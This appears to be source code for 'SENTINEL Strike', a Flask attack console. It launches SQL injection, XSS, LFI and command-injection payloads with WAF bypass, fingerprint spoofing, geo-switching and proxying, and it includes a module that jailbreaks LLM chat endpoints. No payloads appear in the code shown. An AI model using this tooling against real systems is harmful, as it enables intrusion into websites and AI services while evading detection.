                <div style="background: #0d1117; padding: 10px; border-radius: 8px; font-size: 0.8rem;">
                    <div style="color: #8b949e;">Total Payloads: <span style="color: #58a6ff;">39,000+</span></div>
                    <div style="margin-top: 5px; color: #8b949e;">
                        SQLi: <span style="color: #ff6b6b;">93</span> |
                        XSS: <span style="color: #ff6b6b;">67</span> |
                        LFI: <span style="color: #ff6b6b;">54</span> |
                        CMDi: <span style="color: #ff6b6b;">44</span>
                    </div>
                </div>
                
                <button class="btn-secondary" onclick="exportReport()" style="margin-top: 15px;">
                    📄 Export Report
                </button>
            </div>
        </div>
    </div>
    
    <script>
        // State
        let eventSource = null;
        let currentAttackMode = 'web';  // Attack mode: web, llm, hybrid
        let stats = {
            requests: 0,
            blocked: 0,
            bypasses: 0,
            findings: 0,
            fingerprints: 0,
            geoswitch: 0
        };
        
        // Attack type change handler
        document.getElementById('attack-type').addEventListener('change', function() {
            const customSection = document.getElementById('custom-payload-section');
            customSection.style.display = this.value === 'custom' ? 'block' : 'none';
        });
        
        // Browser buttons
        document.querySelectorAll('.browser-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.browser-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
            });
        });
        
        // Country buttons
        document.querySelectorAll('.country-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                document.querySelectorAll('.country-btn').forEach(b => b.classList.remove('active'));
                this.classList.add('active');
            });
        });
        
        function log(message, type = 'info') {
            const console = document.getElementById('console');
            const time = new Date().toLocaleTimeString();
            const entry = document.createElement('div');
            entry.className = 'log-entry';
            entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="log-${type}">${message}</span>`;
            console.appendChild(entry);
            console.scrollTop = console.scrollHeight;
        }
        
        function updateStats() {
            document.getElementById('stat-requests').textContent = stats.requests;
            document.getElementById('stat-blocked').textContent = stats.blocked;
            document.getElementById('stat-bypasses').textContent = stats.bypasses;
            document.getElementById('stat-findings').textContent = stats.findings;
            document.getElementById('stat-fingerprints').textContent = stats.fingerprints;
            document.getElementById('stat-geoswitch').textContent = stats.geoswitch;
        }
        
        function addFinding(finding) {
            const list = document.getElementById('findings-list');
            if (list.querySelector('p')) list.innerHTML = '';
            
            const div = document.createElement('div');
            div.className = `finding ${finding.severity}`;
            div.innerHTML = `
                <div class="finding-title">[${finding.severity.toUpperCase()}] ${finding.type}</div>
                <div style="color: #8b949e; font-size: 0.85rem; margin-top: 5px;">
                    ${finding.description}<br>
                    <code style="color: #a371f7;">${finding.payload || ''}</code>
                </div>
            `;
            list.insertBefore(div, list.firstChild);
        }
        
        function startAttack() {
            const target = document.getElementById('target').value;
            if (!target) {
                log('❌ Please enter target URL', 'error');
                return;
            }
            
            // Collect selected web attack types
            const webAttackTypes = [];
            document.querySelectorAll('input[name="attack"]:checked').forEach(cb => {
                webAttackTypes.push(cb.value);
            });
            
            // Collect selected LLM attack types
            const llmAttackTypes = [];
            document.querySelectorAll('input[name="llm_attack"]:checked').forEach(cb => {
                llmAttackTypes.push(cb.value);
            });
            
            // Validate based on mode
            if (currentAttackMode === 'web' && webAttackTypes.length === 0) {
                log('❌ Please select at least one web attack vector', 'error');
                return;
            }
            if (currentAttackMode === 'llm' && llmAttackTypes.length === 0) {
                log('❌ Please select at least one LLM attack vector', 'error');
                return;
            }
            if (currentAttackMode === 'hybrid' && webAttackTypes.length === 0 && llmAttackTypes.length === 0) {
                log('❌ Please select at least one attack vector', 'error');
                return;
            }
            
            // Launch LLM attacks via HYDRA if in LLM or hybrid mode
            if ((currentAttackMode === 'llm' || currentAttackMode === 'hybrid') && llmAttackTypes.length > 0) {
                const llmConfig = {
                    target: target,
                    attack_types: llmAttackTypes,
                    mode: 'phantom',
                    llm_endpoint: document.getElementById('llm-endpoint-type').value,
                    model: document.getElementById('llm-model').value || 'gemini-3-pro-flash',
                    gemini_api_key: document.getElementById('gemini-api-key')?.value || null,
                    openai_api_key: document.getElementById('openai-api-key')?.value || null
                };
                
                log('🤖 Starting LLM/AI attack via HYDRA...', 'info');
                log(`📊 Vectors: ${llmAttackTypes.join(', ')}`, 'info');
                
                fetch('/api/hydra/attack', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(llmConfig)
                })
                .then(r => r.json())
                .then(data => {
                    if (data.error) {
                        log(`❌ HYDRA Error: ${data.error}`, 'error');
                    } else {
                        log(`✅ HYDRA Started: ${data.status || 'Running'}`, 'success');
                    }
                })
                .catch(e => log(`❌ HYDRA Error: ${e}`, 'error'));
            }
            
            // Continue with web attack if in web or hybrid mode
            if ((currentAttackMode === 'web' || currentAttackMode === 'hybrid') && webAttackTypes.length > 0) {
                const attackTypes = webAttackTypes;
            
            // Collect config
            const config = {
                target: target,
                attack_types: attackTypes,  // Array of selected attacks
                param: document.getElementById('param').value || 'id',
                custom_payload: document.getElementById('custom-payload').value,
                max_payloads: parseInt(document.getElementById('max-payloads').value),
                bypass_variants: parseInt(document.getElementById('bypass-variants').value),
                base_delay: parseFloat(document.getElementById('base-delay').value),
                browser: document.querySelector('.browser-btn.active')?.dataset.browser || 'chrome_win',
                country: document.querySelector('.country-btn.active')?.dataset.country || 'auto',
                waf_bypass: {
                    encoding: document.getElementById('waf-encoding').checked,
                    unicode: document.getElementById('waf-unicode').checked,
                    comments: document.getElementById('waf-comments').checked,
                    case: document.getElementById('waf-case').checked,
                    hex: document.getElementById('waf-hex').checked,
                    char: document.getElementById('waf-char').checked
                },
                stealth: {
                    timing: document.getElementById('stealth-timing').checked,
                    fingerprint: document.getElementById('stealth-fingerprint').checked,
                    geo: document.getElementById('stealth-geo').checked,
                    detect: document.getElementById('stealth-detect').checked
                },
                enterprise: {
                    enabled: document.getElementById('enterprise-mode').checked,
                    use_smuggling: document.getElementById('use-smuggling').checked,
                    aggression: parseInt(document.getElementById('aggression').value),
                    concurrent_agents: parseInt(document.getElementById('concurrent-agents').value),
                    burp_proxy: document.getElementById('burp-proxy').value || null,
                    scraperapi_key: document.getElementById('scraperapi-key').value || null
                }
            };
            
            // Reset stats
            stats = { requests: 0, blocked: 0, bypasses: 0, findings: 0, fingerprints: 0, geoswitch: 0 };
            updateStats();
            document.getElementById('findings-list').innerHTML = '<p style="color: #8b949e; text-align: center; padding: 20px;">No vulnerabilities found yet</p>';
            
            log('🚀 Starting attack on ' + target, 'attack');
            log('Vectors: ' + attackTypes.join(', '), 'info');
            log('Aggression: ' + config.enterprise.aggression + '/10' + (config.enterprise.enabled ? ' [ENTERPRISE]' : ''), 'stealth');
            log('Browser: ' + config.browser + ', Country: ' + config.country, 'stealth');
            
            document.getElementById('btn-start').disabled = true;
            
            // Start SSE connection
            fetch('/api/attack/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(config)
            }).then(r => r.json()).then(data => {
                if (data.status === 'started') {
                    eventSource = new EventSource('/api/attack/stream');
                    
                    eventSource.onmessage = function(event) {
                        const data = JSON.parse(event.data);
                        handleEvent(data);
                    };
                    
                    eventSource.onerror = function() {
                        log('Connection closed', 'warning');
                        document.getElementById('btn-start').disabled = false;
                    };
                }
            });
            } // Close if (currentAttackMode === 'web'...)
        }
        
        function handleEvent(data) {
            switch(data.type) {
                case 'log':
                    log(data.message, data.level || 'info');
                    break;
                case 'request':
                    stats.requests++;
                    break;
                case 'blocked':
                    stats.blocked++;
                    log('⛔ Blocked: ' + data.reason, 'error');
                    break;
                case 'bypass':
                    stats.bypasses++;
                    // Show detailed bypass info
                    let bypassMsg = '🔓 BYPASS [' + (data.severity || 'MEDIUM') + '] ' + 
                                    (data.vector || 'UNK') + ' via ' + data.technique;
                    if (data.response_code) {
                        bypassMsg += ' (HTTP ' + data.response_code + ')';
                    }
                    log(bypassMsg, 'bypass');
                    // Log additional details on separate line
                    if (data.payload) {
                        log('   → Payload: ' + data.payload.substring(0, 60) + '...', 'stealth');
                    }
                    break;
                case 'fingerprint':
                    stats.fingerprints++;
                    document.getElementById('current-browser').textContent = data.browser;
                    break;
                case 'geoswitch':
                    stats.geoswitch++;
                    document.getElementById('current-country').textContent = data.country;
                    log('🌍 Geo switch: ' + data.country, 'stealth');
                    break;
                case 'waf':
                    document.getElementById('current-waf').textContent = data.waf;
                    log('🛡️ WAF detected: ' + data.waf, 'warning');
                    break;
                case 'finding':
                    stats.findings++;
                    addFinding(data.finding);
                    log('🔓 FOUND: ' + data.finding.type + ' - ' + data.finding.severity, 'success');
                    break;
                case 'done':
                    log('✅ Attack completed', 'success');
                    document.getElementById('btn-start').disabled = false;
                    if (eventSource) eventSource.close();
                    break;
            }
            updateStats();
        }
        
        function stopAttack() {
            fetch('/api/attack/stop', { method: 'POST' });
            if (eventSource) eventSource.close();
            log('⏹️ Attack stopped', 'warning');
            document.getElementById('btn-start').disabled = false;
        }
        
        function generateReport() {
            log('📄 Generating professional report...', 'info');
            
            fetch('/api/report/generate', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({})
            })
            .then(r => r.json())
            .then(data => {
                if (data.error) {
                    log(`❌ Report error: ${data.error}`, 'error');
                    return;
                }
                
                log(`✅ Report generated: ${data.report_file}`, 'success');
                log(`🎯 Target: ${data.target}`, 'info');
                log(`📊 Critical: ${data.stats.critical}, High: ${data.stats.high}, Vulns: ${data.stats.unique_vulnerabilities}`, 'info');
                
                // Open report in new tab
                const filename = data.report_file.split(/[\\/]/).pop();
                window.open(`/api/report/download/${filename}`, '_blank');
            })
            .catch(e => log(`❌ Report error: ${e}`, 'error'));
        }
        
        function exportReport() {
            window.open('/api/report', '_blank');
        }
        
        // Attack mode management (currentAttackMode declared at top)
        
        function setAttackMode(mode) {
            console.log('setAttackMode called:', mode);
            currentAttackMode = mode;
            
            // Update UI - remove active from all, add to clicked
            document.querySelectorAll('.mode-tab').forEach(tab => {
                if (tab.dataset.mode === mode) {
                    tab.classList.add('active');
                } else {
                    tab.classList.remove('active');
                }
            });
            
            // Show/hide vector sections
            const webVectors = document.getElementById('web-vectors');
            const llmVectors = document.getElementById('llm-vectors');
            
            if (!webVectors || !llmVectors) {
                console.error('Vector sections not found!');
                return;
            }
            
            if (mode === 'web') {
                webVectors.style.display = 'block';
                llmVectors.style.display = 'none';
            } else if (mode === 'llm') {
                webVectors.style.display = 'none';
                llmVectors.style.display = 'block';
            } else { // hybrid
                webVectors.style.display = 'block';
                llmVectors.style.display = 'block';
            }
            
            log(`🎯 Attack mode: ${mode.toUpperCase()}`, 'info');
            saveSettings();
        }
        
        function selectAllAttacks() {
            if (currentAttackMode === 'web' || currentAttackMode === 'hybrid') {
                document.querySelectorAll('input[name="attack"]').forEach(cb => cb.checked = true);
            }
            if (currentAttackMode === 'llm' || currentAttackMode === 'hybrid') {
                document.querySelectorAll('input[name="llm_attack"]').forEach(cb => cb.checked = true);
            }
        }
        
        function clearAllAttacks() {
            document.querySelectorAll('input[name="attack"]').forEach(cb => cb.checked = false);
            document.querySelectorAll('input[name="llm_attack"]').forEach(cb => cb.checked = false);
        }
        
        // Show custom payload section when 'custom' is checked
        document.querySelectorAll('input[name="attack"]').forEach(cb => {
            cb.addEventListener('change', function() {
                const customSection = document.getElementById('custom-payload-section');
                const customChecked = document.querySelector('input[name="attack"][value="custom"]').checked;
                customSection.style.display = customChecked ? 'block' : 'none';
                saveSettings(); // Auto-save on change
            });
        });
        
        // ============================================================
        // SETTINGS PERSISTENCE (localStorage)
        // ============================================================
        
        const STORAGE_KEY = 'strike_console_settings';
        
        function saveSettings() {
            const settings = {
                // Target & Mode
                target: document.getElementById('target').value,
                attackMode: currentAttackMode,
                param: document.getElementById('param').value,
                maxPayloads: document.getElementById('max-payloads').value,
                
                // Web attack vectors
                webAttacks: Array.from(document.querySelectorAll('input[name="attack"]:checked')).map(cb => cb.value),
                
                // LLM attack vectors
                llmAttacks: Array.from(document.querySelectorAll('input[name="llm_attack"]:checked')).map(cb => cb.value),
                llmEndpoint: document.getElementById('llm-endpoint-type').value,
                llmModel: document.getElementById('llm-model').value,
                
                // WAF Bypass
                wafEncoding: document.getElementById('waf-encoding')?.checked,
                wafUnicode: document.getElementById('waf-unicode')?.checked,
                wafComments: document.getElementById('waf-comments')?.checked,
                wafCase: document.getElementById('waf-case')?.checked,
                wafHex: document.getElementById('waf-hex')?.checked,
                wafChar: document.getElementById('waf-char')?.checked,
                
                // Stealth
                stealthTiming: document.getElementById('stealth-timing')?.checked,
                stealthFingerprint: document.getElementById('stealth-fingerprint')?.checked,
                stealthGeo: document.getElementById('stealth-geo')?.checked,
                stealthDetect: document.getElementById('stealth-detect')?.checked,
                
                // Enterprise
                enterpriseMode: document.getElementById('enterprise-mode')?.checked,
                useSmuggling: document.getElementById('use-smuggling')?.checked,
                aggression: document.getElementById('aggression')?.value,
                concurrentAgents: document.getElementById('concurrent-agents')?.value,
                burpProxy: document.getElementById('burp-proxy')?.value,
                scraperApiKey: document.getElementById('scraperapi-key')?.value,
                geminiApiKey: document.getElementById('gemini-api-key')?.value,
                openaiApiKey: document.getElementById('openai-api-key')?.value,
                
                // Delays
                baseDelay: document.getElementById('base-delay')?.value,
                bypassVariants: document.getElementById('bypass-variants')?.value,
                
                // Custom payload
                customPayload: document.getElementById('custom-payload')?.value,
                
                // Timestamp
                savedAt: new Date().toISOString()
            };
            
            localStorage.setItem(STORAGE_KEY, JSON.stringify(settings));
        }
        
        function loadSettings() {
            const saved = localStorage.getItem(STORAGE_KEY);
            if (!saved) return;
            
            try {
                const settings = JSON.parse(saved);
                
                // Target & Mode
                if (settings.target) document.getElementById('target').value = settings.target;
                if (settings.param) document.getElementById('param').value = settings.param;
                if (settings.maxPayloads) document.getElementById('max-payloads').value = settings.maxPayloads;
                
                // Attack mode
                if (settings.attackMode) setAttackMode(settings.attackMode);
                
                // Web attack vectors
                document.querySelectorAll('input[name="attack"]').forEach(cb => cb.checked = false);
                if (settings.webAttacks) {
                    settings.webAttacks.forEach(v => {
                        const cb = document.querySelector(`input[name="attack"][value="${v}"]`);
                        if (cb) cb.checked = true;
                    });
                }
                
                // LLM attack vectors
                document.querySelectorAll('input[name="llm_attack"]').forEach(cb => cb.checked = false);
                if (settings.llmAttacks) {
                    settings.llmAttacks.forEach(v => {
                        const cb = document.querySelector(`input[name="llm_attack"][value="${v}"]`);
                        if (cb) cb.checked = true;
                    });
                }
                if (settings.llmEndpoint) document.getElementById('llm-endpoint-type').value = settings.llmEndpoint;
                if (settings.llmModel) document.getElementById('llm-model').value = settings.llmModel;
                
                // WAF Bypass
                if (settings.wafEncoding !== undefined && document.getElementById('waf-encoding')) 
                    document.getElementById('waf-encoding').checked = settings.wafEncoding;
                if (settings.wafUnicode !== undefined && document.getElementById('waf-unicode'))
                    document.getElementById('waf-unicode').checked = settings.wafUnicode;
                if (settings.wafComments !== undefined && document.getElementById('waf-comments'))
                    document.getElementById('waf-comments').checked = settings.wafComments;
                if (settings.wafCase !== undefined && document.getElementById('waf-case'))
                    document.getElementById('waf-case').checked = settings.wafCase;
                if (settings.wafHex !== undefined && document.getElementById('waf-hex'))
                    document.getElementById('waf-hex').checked = settings.wafHex;
                if (settings.wafChar !== undefined && document.getElementById('waf-char'))
                    document.getElementById('waf-char').checked = settings.wafChar;
                
                // Stealth
                if (settings.stealthTiming !== undefined && document.getElementById('stealth-timing'))
                    document.getElementById('stealth-timing').checked = settings.stealthTiming;
                if (settings.stealthFingerprint !== undefined && document.getElementById('stealth-fingerprint'))
                    document.getElementById('stealth-fingerprint').checked = settings.stealthFingerprint;
                if (settings.stealthGeo !== undefined && document.getElementById('stealth-geo'))
                    document.getElementById('stealth-geo').checked = settings.stealthGeo;
                if (settings.stealthDetect !== undefined && document.getElementById('stealth-detect'))
                    document.getElementById('stealth-detect').checked = settings.stealthDetect;
                
                // Enterprise
                if (settings.enterpriseMode !== undefined && document.getElementById('enterprise-mode'))
                    document.getElementById('enterprise-mode').checked = settings.enterpriseMode;
                if (settings.useSmuggling !== undefined && document.getElementById('use-smuggling'))
                    document.getElementById('use-smuggling').checked = settings.useSmuggling;
                if (settings.aggression && document.getElementById('aggression'))
                    document.getElementById('aggression').value = settings.aggression;
                if (settings.concurrentAgents && document.getElementById('concurrent-agents'))
                    document.getElementById('concurrent-agents').value = settings.concurrentAgents;
                if (settings.burpProxy && document.getElementById('burp-proxy'))
                    document.getElementById('burp-proxy').value = settings.burpProxy;
                if (settings.scraperApiKey && document.getElementById('scraperapi-key'))
                    document.getElementById('scraperapi-key').value = settings.scraperApiKey;
                if (settings.geminiApiKey && document.getElementById('gemini-api-key'))
                    document.getElementById('gemini-api-key').value = settings.geminiApiKey;
                if (settings.openaiApiKey && document.getElementById('openai-api-key'))
                    document.getElementById('openai-api-key').value = settings.openaiApiKey;
                
                // Delays
                if (settings.baseDelay && document.getElementById('base-delay'))
                    document.getElementById('base-delay').value = settings.baseDelay;
                if (settings.bypassVariants && document.getElementById('bypass-variants'))
                    document.getElementById('bypass-variants').value = settings.bypassVariants;
                
                // Custom payload
                if (settings.customPayload && document.getElementById('custom-payload'))
                    document.getElementById('custom-payload').value = settings.customPayload;
                
                log(`📂 Settings loaded (saved ${new Date(settings.savedAt).toLocaleString()})`, 'info');
                
            } catch (e) {
                console.error('Failed to load settings:', e);
            }
        }
        
        // Auto-save on input changes
        document.querySelectorAll('input, select, textarea').forEach(el => {
            el.addEventListener('change', saveSettings);
        });
        
        // Load settings on page load
        loadSettings();
        
        // Init log
        log('🥷 SENTINEL Strike v3.0 ready', 'success');
        log('Select attack vectors and press START', 'info');
    </script>
</body>
</html>
"""


# ============================================================================
# ROUTES
# ============================================================================


@app.route("/")
def index():
    # Use external template for cleaner code separation
    try:
        return render_template("console.html")
    except Exception:
        # Fallback to embedded template if external fails
        return render_template_string(HTML_TEMPLATE)


@app.route("/api/attack/start", methods=["POST"])
def start_attack():
    global attack_running, attack_results

    config = request.json
    attack_running = True
    attack_results = []

    # Create new log file for this attack
    log_file = file_logger.new_attack(config.get("target", "unknown"))

    # Clear log queue
    while not attack_log.empty():
        try:
            attack_log.get_nowait()
        except:
            break

    # Start attack in background thread
    thread = threading.Thread(target=run_attack_thread, args=(config,))
    thread.daemon = True
    thread.start()

    return jsonify({"status": "started", "log_file": log_file})


@app.route("/api/attack/stop", methods=["POST"])
def stop_attack():
    global attack_running
    attack_running = False
    return jsonify({"status": "stopped"})


@app.route("/api/attack/stream")
def attack_stream():
    def generate():
        while attack_running or not attack_log.empty():
            try:
                event = attack_log.get(timeout=0.5)
                yield f"data: {json.dumps(event)}\n\n"
            except:
                if not attack_running:
                    break
        yield f"data: {json.dumps({'type': 'done'})}\n\n"

    return Response(generate(), mimetype="text/event-stream")


@app.route("/api/report")
def get_report():
    report = {
        "timestamp": datetime.now().isoformat(),
        "results": attack_results,
    }
    return jsonify(report)


@app.route("/api/report/generate", methods=["POST"])
def generate_professional_report():
    """
    Generate professional pentest report from attack logs.

    Request body:
    {
        "log_file": "attack_20251222_221517.jsonl"  // optional, uses latest if not specified
    }

    Returns: HTML report file path
    """
    try:
        from strike.reporting import StrikeReportGenerator
    except ImportError:
        return jsonify({"error": "Reporting module not available"}), 500

    data = request.json or {}
    log_file = data.get("log_file")

    # Find log file
    if log_file:
        log_path = LOG_DIR / log_file
    else:
        # Use latest log file
        log_files = sorted(
            LOG_DIR.glob("attack_*.jsonl"),
            key=lambda f: f.stat().st_mtime,
            reverse=True,
        )
        if not log_files:
            return jsonify({"error": "No attack logs found"}), 404
        log_path = log_files[0]

    if not log_path.exists():
        return jsonify({"error": f"Log file not found: {log_file}"}), 404

    # Generate report
    generator = StrikeReportGenerator(str(log_path))
    reports_dir = Path(__file__).parent.parent / "reports"
    saved_files = generator.save(str(reports_dir), formats=["html"])

    if not saved_files:
        return jsonify({"error": "Failed to generate report"}), 500

    return jsonify(
        {
            "success": True,
            "report_file": saved_files[0],
            "target": (
                generator.report_data.target if generator.report_data else "Unknown"
            ),
            "stats": {
                "critical": (
                    generator.report_data.critical_count if generator.report_data else 0
                ),
                "high": (
                    generator.report_data.high_count if generator.report_data else 0
                ),
                "medium": (
                    generator.report_data.medium_count if generator.report_data else 0
                ),
                "unique_vulnerabilities": (
                    len(generator.report_data.findings) if generator.report_data else 0
                ),
                "success_rate": (
                    generator.report_data.success_rate if generator.report_data else 0
                ),
            },
        }
    )


@app.route("/api/report/download/<path:filename>")
def download_report(filename):
    """Download generated report file."""
    reports_dir = Path(__file__).parent.parent / "reports"
    report_path = reports_dir / filename

    if not report_path.exists():
        return jsonify({"error": "Report not found"}), 404

    with open(report_path, "r", encoding="utf-8") as f:
        content = f.read()

    return Response(content, mimetype="text/html")


@app.route("/api/report/list")
def list_reports():
    """List all available reports."""
    reports_dir = Path(__file__).parent.parent / "reports"
    if not reports_dir.exists():
        return jsonify({"reports": []})

    reports = []
    for f in sorted(
        reports_dir.glob("strike_report_*.html"),
        key=lambda x: x.stat().st_mtime,
        reverse=True,
    ):
        reports.append(
            {
                "filename": f.name,
                "size": f.stat().st_size,
                "created": datetime.fromtimestamp(f.stat().st_mtime).isoformat(),
            }
        )

    return jsonify({"reports": reports[:20]})  # Last 20 reports


@app.route("/api/hydra/attack", methods=["POST"])
def start_hydra_attack():
    """
    Start HYDRA multi-head attack for LLM targets.

    Request body:
    {
        "target": "https://api.example.com/chat",
        "attack_types": ["jailbreak", "multiturn"],
        "mode": "phantom"
    }
    """
    global attack_running

    data = request.json or {}
    target = data.get("target")
    attack_types = data.get("attack_types", ["jailbreak"])
    mode = data.get("mode", "phantom")

    if not target:
        return jsonify({"error": "Target URL required"}), 400

    if attack_running:
        return jsonify({"error": "Attack already running"}), 409

    attack_running = True

    def run_hydra():
        global attack_running
        try:
            from strike.hydra import HydraAttackController

            async def execute():
                controller = HydraAttackController()
                await controller.initialize(mode)

                # Initialize LLM if available - use config from request
                llm = None
                if LLM_AVAILABLE:
                    try:
                        # Get LLM settings from request
                        llm_endpoint = data.get("llm_endpoint", "gemini")
                        llm_model = data.get("model", "gemini-3-pro-flash")
                        gemini_key = (
                            data.get("gemini_api_key")
                            or os.environ.get("GEMINI_API_KEY")
                            or os.environ.get("GOOGLE_API_KEY")
                        )
                        openai_key = data.get("openai_api_key") or os.environ.get(
                            "OPENAI_API_KEY"
                        )

                        # Log received config for debugging
                        log_event(
                            {
                                "type": "log",
                                "message": f"🔧 LLM Config: endpoint={llm_endpoint}, model={llm_model}, key_present={bool(gemini_key)}",
                                "level": "info",
                            }
                        )

                        # Create config based on selected endpoint
                        from strike.ai.llm_manager import LLMConfig, LLMProvider

                        if llm_endpoint == "gemini" and gemini_key:
                            config = LLMConfig(
                                provider=LLMProvider.GEMINI,
                                model=llm_model,
                                api_key=gemini_key,
                            )
                            llm = StrikeLLMManager(config)
                        elif llm_endpoint == "openai" and openai_key:
                            config = LLMConfig(
                                provider=LLMProvider.OPENAI,
                                model=llm_model,
                                api_key=openai_key,
                            )
                            llm = StrikeLLMManager(config)
                        else:
                            # Fallback to auto-detect - log why
                            if llm_endpoint == "gemini" and not gemini_key:
                                log_event(
                                    {
                                        "type": "log",
                                        "message": "⚠️ Gemini selected but no API key - using auto-detect",
                                        "level": "warning",
                                    }
                                )
                            llm = StrikeLLMManager()

                        log_event(
                            {
                                "type": "log",
                                "message": f"🧠 AI Attack Planner: {llm.config.provider.value}/{llm.config.model}",
                                "level": "attack",
                            }
                        )
                    except Exception as e:
                        log_event(
                            {
                                "type": "log",
                                "message": f"⚠️ AI not available: {e}",
                                "level": "warning",
                            }
                        )

                # Initialize ScraperAPI proxy for HYDRA if provided
                scraperapi_key = data.get("scraperapi_key")
                country = data.get("country", "us")
                proxy_url = None

                if scraperapi_key:
                    proxy_url = f"http://scraperapi:{scraperapi_key}@proxy-server.scraperapi.com:8001"
                    log_event(
                        {
                            "type": "log",
                            "message": f"🏠 ScraperAPI Proxy: ENABLED (Country: {country.upper()})",
                            "level": "attack",
                        }
                    )
                    # Set proxy in controller for HTTP requests
                    controller.proxy_url = proxy_url
                else:
                    log_event(
                        {
                            "type": "log",
                            "message": "⚠️ No proxy configured - using direct connection",
                            "level": "warning",
                        }
                    )

                # AI Detection: scan for hidden AI before attack
                log_event(
                    {
                        "type": "log",
                        "message": "🔍 Scanning for hidden AI...",
                        "level": "info",
                    }
                )
                try:
                    from strike.recon import AIDetector

                    detector = AIDetector(timeout=10)
                    ai_result = await detector.detect(target)

                    if ai_result.detected:
                        log_event(
                            {
                                "type": "log",
                                "message": f"🤖 HIDDEN AI DETECTED! Confidence: {ai_result.confidence:.0%}",
                                "level": "finding",
                            }
                        )
                        log_event(
                            {
                                "type": "log",
                                "message": f"📍 AI Type: {ai_result.ai_type}",
                                "level": "info",
                            }
                        )
                        if ai_result.endpoints:
                            log_event(
                                {
                                    "type": "log",
                                    "message": f'🎯 AI Endpoints: {", ".join(ai_result.endpoints[:3])}',
                                    "level": "info",
                                }
                            )
                        if ai_result.forms:
                            log_event(
                                {
                                    "type": "log",
                                    "message": f"📝 AI Forms: {len(ai_result.forms)} found",
                                    "level": "info",
                                }
                            )
                    else:
                        log_event(
                            {
                                "type": "log",
                                "message": f"❌ No hidden AI detected (confidence: {ai_result.confidence:.0%})",
                                "level": "info",
                            }
                        )
                except Exception as e:
                    log_event(
                        {
                            "type": "log",
                            "message": f"⚠️ AI detection error: {e}",
                            "level": "warning",
                        }
                    )

                log_event(
                    {
                        "type": "log",
                        "message": f"🐙 HYDRA: Starting {mode.upper()} mode attack",
                        "level": "attack",
                    }
                )
                log_event(
                    {"type": "log", "message": f"🎯 Target: {target}", "level": "info"}
                )
                log_event(
                    {
                        "type": "log",
                        "message": f'⚔️ Attack types: {", ".join(attack_types)}',
                        "level": "info",
                    }
                )

                result = await controller.execute_attack(target, attack_types, llm)

                log_event(
                    {
                        "type": "log",
                        "message": f'✅ HYDRA complete: {len(result.get("findings", []))} findings',
                        "level": "finding" if result.get("findings") else "info",
                    }
                )

                for finding in result.get("findings", []):
                    log_event(
                        {
                            "type": "finding",
                            "severity": finding.get("severity", "medium"),
                            "message": f"{finding.get('type')}: {finding.get('description', '')[:100]}",
                        }
                    )
                    attack_results.append(finding)

                return result

            asyncio.run(execute())

        except Exception as e:
            log_event(
                {"type": "log", "message": f"❌ HYDRA error: {e}", "level": "error"}
            )
        # NOTE: Do NOT set attack_running = False here!
        # In HYBRID mode, web attacks run in parallel and should not be killed.
        # Each attack thread manages its own completion.
        # Only log HYDRA completion, don't signal global done.
        log_event(
            {"type": "log", "message": "🐙 HYDRA thread finished", "level": "info"}
        )

    thread = threading.Thread(target=run_hydra, daemon=True)
    thread.start()

    return jsonify(
        {
            "status": "started",
            "mode": "hydra",
            "target": target,
            "attack_types": attack_types,
        }
    )


# ============================================================================
# RECON API ENDPOINTS
# ============================================================================


@app.route("/api/recon/fingerprint", methods=["POST"])
def fingerprint_target():
    """
    Technology fingerprinting for a target URL.

    Request body:
    {
        "url": "https://example.com"
    }
    """
    try:
        from strike.recon import TechFingerprinter

        data = request.get_json() or {}
        url = data.get("url", "")

        if not url:
            return jsonify({"error": "URL required"}), 400

        # Run fingerprinting
        def run_fingerprint():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            try:
                fp = TechFingerprinter(timeout=15)
                result = loop.run_until_complete(fp.fingerprint(url))
                return {
                    "url": url,
                    "technologies": result.technologies,
                    "security_headers": result.security_headers,
                    "missing_headers": result.missing_security_headers,
                    "cookies": result.cookies,
                    "error": result.error,
                }
            finally:
                loop.close()

        result = run_fingerprint()
        return jsonify(result)

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/recon/scan", methods=["POST"])
def network_scan():
    """
    Network port scanning.

    Request body:
    {
        "target": "example.com",
        "scan_type": "quick"  // quick, full, web
    }
    """
    try:
        from strike.recon import NetworkScanner

        data = request.get_json() or {}
        target = data.get("target", "")
        scan_type = data.get("scan_type", "quick")

        if not target:
            return jsonify({"error": "Target required"}), 400

        scanner = NetworkScanner()

        if scan_type == "full":
            result = scanner.full_scan(target)
        elif scan_type == "web":
            result = scanner.web_scan(target)
        else:
            result = scanner.quick_scan(target)

        return jsonify(
            {
                "target": target,
                "scan_type": scan_type,
                "ports": result.ports,
                "services": result.services,
                "os": result.os_detection,
                "vulnerabilities": result.vulnerabilities,
                "error": result.error,
            }
        )

    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/api/recon/deep", methods=["POST"])
def deep_recon():
    """
    Deep reconnaissance: ChatbotFinder + IP Range Scanner.

    Discovers all endpoints, subdomains, and chat services for a target.

    Request body:
    {
        "target": "https://example.com",
        "scan_ip_range": true,
        "scraperapi_key": "optional_key"
    }
    """
    data = request.get_json() or {}
    target = data.get("target", "")
    scan_ip_range = data.get("scan_ip_range", False)
    scraperapi_key = data.get("scraperapi_key", "")

    if not target:
        return jsonify({"error": "Target URL required"}), 400

    # Build proxy URL if ScraperAPI key provided
    proxy_url = None
    if scraperapi_key:
        proxy_url = (
            f"http://scraperapi:{scraperapi_key}@proxy-server.scraperapi.com:8001"
        )

    def run_deep_recon():
        import asyncio

        async def execute():
            results = {
                "target": target,
                "chatbot_endpoints": [],
                "ip_range_hosts": [],
                "all_endpoints": [],
                "subdomains": [],
                "summary": {},
            }

            # 1. ChatbotFinder - find chat endpoints
            try:
                from strike.recon.chatbot_finder import ChatbotFinder

                log_event(
                    {
                        "type": "log",
                        "message": f"🔍 ChatbotFinder scanning {target}...",
                        "level": "info",
                    }
                )

                finder = ChatbotFinder(timeout=20, proxy_url=proxy_url)
                endpoints = await finder.discover(target)

                for ep in endpoints:
                    ep_dict = {
                        "url": ep.url,
                        "type": ep.type,
                        "provider": ep.provider,
                        "confidence": ep.confidence,
                    }
                    results["chatbot_endpoints"].append(ep_dict)
